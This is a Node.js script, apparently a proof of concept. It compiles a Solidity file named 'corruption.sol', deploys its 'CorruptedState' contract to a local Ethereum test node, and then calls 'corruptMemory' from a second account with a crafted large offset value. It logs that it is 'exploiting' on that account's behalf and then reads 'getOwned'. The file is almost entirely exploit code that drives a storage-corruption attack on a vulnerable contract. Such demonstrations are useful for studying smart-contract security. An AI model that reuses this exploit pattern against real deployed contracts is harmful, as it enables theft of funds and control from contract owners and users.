const fs = require('fs'); // Built-in dependency for file streaming.
const solc = require('solc'); // Our Solidity compiler

// Import the Web3 library at the top of your file
const Web3 = require('web3');


const content = fs.readFileSync('corruption.sol', 'utf-8'); // Read the file...

// Format the input for solc compiler:
const input = {
  language: 'Solidity',
  sources: {
    'corruption.sol' : {
      "content": content // The imported content
    }
  },
  settings: {
    outputSelection: {
      '*': {
        '*': ['*']
      }
    }
  }
}; 

const output = JSON.parse(solc.compile(JSON.stringify(input)));

// Set up a provider
const provider = new Web3.providers.HttpProvider("http://localhost:8545");

// Connect to the network and save it as "web3"
const web3 = new Web3(provider);

// Get the compiled contract's abi (interface)
const HelloWorld = output.contracts["corruption.sol"];


const { abi, evm } = HelloWorld.CorruptedState // We'll use the "evm" variable later

// Initialize a new contract object:
const contract = new web3.eth.Contract(abi);

console.log("Done compiling");

function deployAndRunContract() {
	web3.eth.getAccounts().then(function(addresses) {
		web3.eth.getGasPrice().then(function(gasPrice) {
			// Deploy the HelloWorld contract (its bytecode) 
			// by spending some gas from our first address
			contract.deploy({
				data: evm.bytecode.object,
			})
			.send({
				from: addresses[0],
				gas: 1000000,
				gasPrice,
			})
			.on('error', function(err) {
				console.log("Failed to deploy:", err) 
			}).then(function(newContract) {
				console.log("Deployed corruptible contract");
				console.log("calling exploitable target, exploiting for " + addresses[1]);
				newContract.methods.corruptMemory('0x800000000000000000000000000000000000000000000000000000000000000',
                                                  '1234567890').send({
					from: addresses[1],
					gas: 1000000,
					gasPrice,
				}).then(function(receipt) {
					console.log("completed corruption, fetching account balance for " + addresses[1]) 
					newContract.methods.getOwned().call({
						from: addresses[1]
					}).then(console.log);
				});
			})
		})
	})
}

deployAndRunContract(); // Call the function
